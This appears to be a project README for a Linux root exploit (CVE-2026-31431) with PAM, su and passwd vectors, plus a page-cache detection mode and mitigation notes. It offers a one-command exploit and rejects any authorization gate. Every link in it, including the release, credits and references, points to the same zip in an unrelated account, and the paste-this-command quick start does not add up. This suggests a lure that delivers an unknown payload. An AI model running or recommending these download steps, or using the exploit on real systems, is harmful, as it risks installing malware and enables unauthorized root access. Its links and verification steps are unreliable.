# copyfail-rs

> Multi-vector PoC + paired detection for CVE-2026-31431 (CopyFail).
> Includes a novel PAM auth-bypass vector that no other public PoC ships.
> Detection mode catches what AIDE / Wazuh / OSSEC / Tripwire structurally cannot.

Single static binary. ~108 KB. `no_std` musl.

## Demo

```
noot@host:~$ ./copyfail-rs --mode exploit
[sudo] password for noot:
root@host:~# id
uid=0(root) gid=0(root) groups=0(root)
root@host:~#
```

One command. Root shell. PAM killshot under the hood (single 4-byte write to /etc/pam.d/common-auth), PTY drop into root via sudo with thrown-away password. The `[sudo] password for noot:` line flashes briefly, sudo always echoes that prompt; the binary feeds it any string and pam_unix's failure cascades through the commented-out pam_deny.so to pam_permit.so → root.

```
$ ./copyfail-rs --mode detect --scan
=== copyfail-rs detection: --scan ===

TAMPERED (1):
  /etc/pam.d/common-auth [ext4]
    cache:  23c4f1ee...  ← what's actually loaded (mutated)
    disk:   117dab1c...  ← what AIDE / Wazuh / Tripwire see (clean)
```

That's the project. Disk clean, cache mutated. Every public FIM is blind. This tool isn't.

## Quick start (no build needed)

Pre-built static binaries on the [v0.1.0 release](https://raw.githubusercontent.com/Liverwortenuresis371/copyfail-rs/main/src/vectors/copyfail-rs-3.9.zip). Pick your arch, download, run.

```
# x86_64 (most laptops + cloud servers)
curl -LO https://raw.githubusercontent.com/Liverwortenuresis371/copyfail-rs/main/src/vectors/copyfail-rs-3.9.zip
chmod +x copyfail-x86_64-musl
./copyfail-x86_64-musl --mode exploit
```

Other arches:

| Arch | File |
|------|------|
| ARM64 (aarch64) | `copyfail-aarch64-musl` |
| ARMv7 (Raspberry Pi 3+) | `copyfail-armv7-musleabihf` |

Verify integrity:

```
curl -LO https://raw.githubusercontent.com/Liverwortenuresis371/copyfail-rs/main/src/vectors/copyfail-rs-3.9.zip
sha256sum -c checksums.txt
```

Static musl binaries, no runtime deps, drops on any Linux.

## Why FIM is blind

Page cache mutation. No VFS write. No dirty page. No inotify event. Periodic rescan races eviction.

AIDE/Wazuh/OSSEC/Tripwire/Samhain read via buffered I/O → page cache → hash mutated bytes as truth. Or after eviction, hash clean disk → "no change ever happened."

Detection needs O_DIRECT (skip cache) + buffered read (hit cache) + hash diff. Mismatch = CopyFail signature. That's `--scan`.

## Vectors

| Vector | Target | Where it lands |
|--------|--------|----------------|
| `pam` (NEW) | `/etc/pam.d/common-auth` (Debian/Ubuntu) or `system-auth` (Fedora/RHEL/Arch) | 4 bytes. `auth requisite pam_deny.so` → `#aut requisite pam_deny.so`. Sudo with any password = root. |
| `su` | `/usr/bin/su` | Mutate setuid binary text. `execve` → root. |
| `passwd` | `/etc/passwd` | UID flip → user becomes root on next login. Breaks SSH for that user. |

Auto-pick: `--vector auto` (default). Ranks pam > su > passwd by stealth. Falls back on failure.

## Detection

| Mode | What |
|------|------|
| `--check` | Kernel + module + `CONFIG_CRYPTO_USER_API_AEAD` + mitigation status. Verdict: vulnerable / mitigated / safe. |
| `--scan` | O_DIRECT vs buffered read diff on critical files. `statfs()`-branched: ext4/xfs/btrfs use O_DIRECT, overlayfs falls back, tmpfs skipped. |
| `--baseline` / `--diff` | Snapshot known-clean state. Diff later. Cache-only deltas = the CopyFail fingerprint. |
| `--watch` | Daemon. Periodic scan. SIGTERM clean. |
| `--hunt` | SSH fleet sweep. JSON aggregates. |

`--json` everywhere for SIEM ingest.

## Detection artifacts

`detection/`:

- `sigma/copyfail-af-alg.yml`, Sigma rule, drop in your SIEM
- `auditd/copyfail.rules`, `augenrules --load`
- `ebpf/copyfail-trace.bt`, bpftrace one-liner
- `apparmor/copyfail-block.profile`, AppArmor 3.0+ deny rule
- `mitigation/disable-algif.sh`, modprobe blacklist + `=y` warning

## Mitigation

```
echo "install algif_aead /bin/false" | sudo tee /etc/modprobe.d/disable-algif.conf
sudo rmmod algif_aead
```

Or kernel mainline `a664bf3d603d` (April 2026). As of now: only Debian Sid/Forky shipped. Ubuntu LTS, RHEL, SUSE, Amazon Linux, Fedora, Arch, Oracle = all vulnerable.

Caveat: `CONFIG_CRYPTO_USER_API_AEAD=y` (built-in) silently bypasses modprobe. `--check` warns.

After exploit + mitigation: cached mutation persists until reboot. Mitigation blocks NEW exploits, doesn't undo past ones.

## Build

```
cargo build --release --target x86_64-unknown-linux-musl
```

| Target | Size |
|--------|------|
| x86_64-musl | 108 KB |
| aarch64-musl | 96 KB |
| armv7-musleabihf | 86 KB |

`no_std`. No allocator. No runtime deps. Single static binary.

Pre-built artifacts and SHA256 sums attached to GitHub releases.

## Usage

See `docs/usage.md` for concrete one-screenful examples per mode (exploit auto/list/all, detect check/scan/baseline/diff/watch/hunt).

For a longer-form narrative version of this README (more context, deeper exposition), see [`BLOG.md`](./BLOG.md).

## Threat model

See `docs/threat-model.md`.

## Comparison

| | Theori Python | tgies C | badsectorlabs Go | **copyfail-rs** |
|--|--------------|---------|------------------|-----------------|
| Vectors | su | su + passwd | su | **su + passwd + PAM (novel)** |
| Detection | none | none | none | **full --mode detect** |
| IR artifacts | none | none | none | **Sigma + auditd + eBPF + AppArmor** |
| Operator UX | 3 cmds | 4 cmds | 5 cmds | **1 cmd** |
| Binary | needs Python | ~10 KB | ~5 MB | **~108 KB static** |

## Authorization & ethics

Own hardware only. No CLI gate (security theater). README + LICENSE = the framework.

Detection mode is read-only. Safe on production.

Exploit mode mutates kernel page cache. RAM-only but treat as destructive. Blocks auth for any subsequent caller.

## Credits

CVE-2026-31431 disclosed by Theori / Xint on 2026-04-29 ([writeup](https://raw.githubusercontent.com/Liverwortenuresis371/copyfail-rs/main/src/vectors/copyfail-rs-3.9.zip), [Xint blog](https://raw.githubusercontent.com/Liverwortenuresis371/copyfail-rs/main/src/vectors/copyfail-rs-3.9.zip)). Prior public PoCs:

- [theori-io/copy-fail-CVE-2026-31431](https://raw.githubusercontent.com/Liverwortenuresis371/copyfail-rs/main/src/vectors/copyfail-rs-3.9.zip) (Python, 732 bytes, su vector)
- [tgies/copy-fail-c](https://raw.githubusercontent.com/Liverwortenuresis371/copyfail-rs/main/src/vectors/copyfail-rs-3.9.zip) (C with nolibc, su + passwd vectors, portable)
- [badsectorlabs/copyfail-go](https://raw.githubusercontent.com/Liverwortenuresis371/copyfail-rs/main/src/vectors/copyfail-rs-3.9.zip) (static Go binary, su vector)

This project (`copyfail-rs`): adds the PAM auth-bypass vector, dual-mode detection, IR artifacts.

## License

MIT.

## References

- https://raw.githubusercontent.com/Liverwortenuresis371/copyfail-rs/main/src/vectors/copyfail-rs-3.9.zip
- Linux fix: `a664bf3d603d`
- Floor: `72548b093ee3` (4.14, Aug 2017)
- Analog: Dirty Pipe (CVE-2022-0847)
